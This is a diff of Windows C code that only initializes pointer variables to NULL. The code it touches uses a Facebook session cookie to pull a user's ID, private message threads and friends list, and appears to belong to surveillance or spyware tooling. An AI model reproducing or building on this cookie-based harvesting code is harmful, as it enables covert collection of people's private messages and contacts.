@@ -48,7 +48,7 @@ LPSTR FacebookGetScreenName(LPSTR strBuffer, LPSTR strUserId)
 
 BOOL FacebookGetUserInfo(LPSTR strCookie, LPSTR *strUserId, LPSTR *strScreenName)
 {
-	LPSTR strRecvBuffer, strParser;
+	LPSTR strRecvBuffer=NULL, strParser=NULL;
 	DWORD dwRet, dwBufferSize;
 
 	*strUserId = *strScreenName = NULL;
@@ -87,7 +87,7 @@ BOOL FacebookParseThreads(LPSTR strCookie, LPSTR strUserId, LPSTR strScreenName,
 	CHAR strAuthor[256];
 	CHAR strAuthorId[256];
 	DWORD dwRet, dwBufferSize;
-	LPSTR strRecvBuffer, strRecvBuffer2, strParser1, strParser2, strInnerParser1, strInnerParser2;
+	LPSTR strRecvBuffer=NULL, strRecvBuffer2=NULL, strParser1, strParser2, strInnerParser1, strInnerParser2;
 
 
 	LPSTR strMsgBody = NULL;
@@ -377,7 +377,7 @@ DWORD FacebookContactHandler(LPSTR strCookie)
 	LPWSTR strUrl = (LPWSTR) zalloc(2048*sizeof(WCHAR));
 	_snwprintf_s(strUrl, 2048, _TRUNCATE, L"/ajax/typeahead/first_degree.php?__a=1&viewer=%S&token=v7&filter[0]=user&options[0]=friends_only&__user=%S", strUserId, strUserId); //FIXME array
 
-	LPSTR strRecvBuffer;
+	LPSTR strRecvBuffer=NULL;
 	DWORD dwBuffSize;
 	DWORD dwRet = HttpSocialRequest(L"www.facebook.com", L"GET", strUrl, 443, NULL, 0, (LPBYTE *)&strRecvBuffer, &dwBuffSize, strCookie); // FIXME: array
 	if (dwRet != SOCIAL_REQUEST_SUCCESS)
